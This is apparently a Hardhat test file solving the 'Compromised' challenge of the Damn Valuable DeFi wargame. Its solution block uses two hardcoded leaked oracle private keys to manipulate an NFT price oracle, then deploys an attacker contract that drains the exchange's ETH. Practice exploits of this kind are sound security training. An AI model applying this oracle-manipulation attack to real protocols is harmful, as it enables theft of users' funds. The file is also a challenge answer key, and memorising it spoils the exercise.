const { expect } = require("chai");
const { ethers } = require("hardhat");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe("Compromised challenge", function () {
  let deployer, player;
  let oracle, exchange, nftToken;

  const sources = [
    "0xA73209FB1a42495120166736362A1DfA9F95A105",
    "0xe92401A4d3af5E446d93D11EEc806b1462b39D15",
    "0x81A5D6E50C214044bE44cA0CB057fe119097850c",
  ];

  const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
  const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
  const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
  const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    // Initialize balance of the trusted source addresses
    for (let i = 0; i < sources.length; i++) {
      setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
      expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
    }

    // Player starts with limited balance
    setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);

    // Deploy the oracle and setup the trusted sources with initial prices
    const TrustfulOracleInitializerFactory = await ethers.getContractFactory("TrustfulOracleInitializer", deployer);
    oracle = await (
      await ethers.getContractFactory("TrustfulOracle", deployer)
    ).attach(
      await (
        await TrustfulOracleInitializerFactory.deploy(
          sources,
          ["DVNFT", "DVNFT", "DVNFT"],
          [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
        )
      ).oracle()
    );

    // Deploy the exchange and get an instance to the associated ERC721 token
    exchange = await (
      await ethers.getContractFactory("Exchange", deployer)
    ).deploy(oracle.address, { value: EXCHANGE_INITIAL_ETH_BALANCE });
    nftToken = await (await ethers.getContractFactory("DamnValuableNFT", deployer)).attach(await exchange.token());
    expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
    expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    // 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
    // 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9

    const PRICE = ethers.utils.parseEther("0.01");

    const oracleSigners = [];

    for (const privateKey of [
      "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
      "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
    ]) {
      const wallet = new ethers.Wallet(privateKey);

      const signer = oracleSigners.push(oracle.connect(wallet.connect(ethers.provider)));

      await oracleSigners[signer - 1].postPrice("DVNFT", PRICE);
    }

    const attacker = await (
      await ethers.getContractFactory("CompromisedAttacker", player)
    ).deploy(exchange.address, nftToken.address, {
      value: PRICE,
    });

    const tx = attacker.connect(player);

    await tx
      .startAttack()
      .then(async () => {
        const exchangeBalance = await ethers.provider.getBalance(exchange.address);
        for (const signer of oracleSigners) await signer.postPrice("DVNFT", exchangeBalance);
      })
      .then(async () => await tx.withdrawFunds())
      .finally(async () => {
        for (const signer of oracleSigners) await signer.postPrice("DVNFT", INITIAL_NFT_PRICE);
      });
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Exchange must have lost all ETH
    expect(await ethers.provider.getBalance(exchange.address)).to.be.eq(0);

    // Player's ETH balance must have significantly increased
    expect(await ethers.provider.getBalance(player.address)).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);

    // Player must not own any NFT
    expect(await nftToken.balanceOf(player.address)).to.be.eq(0);

    // NFT price shouldn't have changed
    expect(await oracle.getMedianPrice("DVNFT")).to.eq(INITIAL_NFT_PRICE);
  });
});
